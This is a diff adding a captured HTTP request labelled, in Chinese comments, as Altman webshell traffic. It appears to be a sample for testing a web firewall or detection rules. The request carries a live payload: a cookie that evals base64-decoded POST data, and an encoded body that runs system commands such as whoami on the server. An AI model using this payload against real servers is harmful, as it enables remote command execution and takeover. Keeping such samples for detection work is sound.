@@ -1,0 +1,13 @@
+# webshell活动_Altman_PHP_phpEvalCookie_命令执行
+# Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。
+# 攻击者通过Altman webshell工具建立连接，执行任意命令。将执行的命令通过base64编码，并将解码方式放在cookie中，webshell以cookie方式接受传递的参数
+POST /shell.php?acid=80002247&bid=hd_tag_m8mv25m9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25m9
+RM-PRO-Token: 07f14afe589450a33915dc47e76ac8b2
+RM-PRO-Time: 1742808481060
+cookie: cmd=print(%22-%3e%7c%22)%3beval(base64_decode(%24_POST%5bq%5d))%3bprint(%22%7c%3c-%22)%3bdie()%3b
+User-Agent: Mozilla/5.0?(compatible;?Yahoo!?Slurp;?http://help.yahoo.com/help/us/ysearch/slurp")
+Content-Type: application/x-www-form-urlencoded
+
+q=JHA9YmFzZTY0X2RlY29kZSgkX1BPU1RbIm0iXSk7DQokcz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsidiJdKTsNCiRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTsNCiRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2fIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOw0KJHI9InskcH0geyRjfSI7DQpAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7DQpwcmludCAoJHJldCE9MCk%2fInJldD17JHJldH0iOiIiOw%3d%3d&m=Y21k&v=Y2QgL2QgIkM6L3BocHN0dWR5X3Byby9XV1ciJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3d%3d
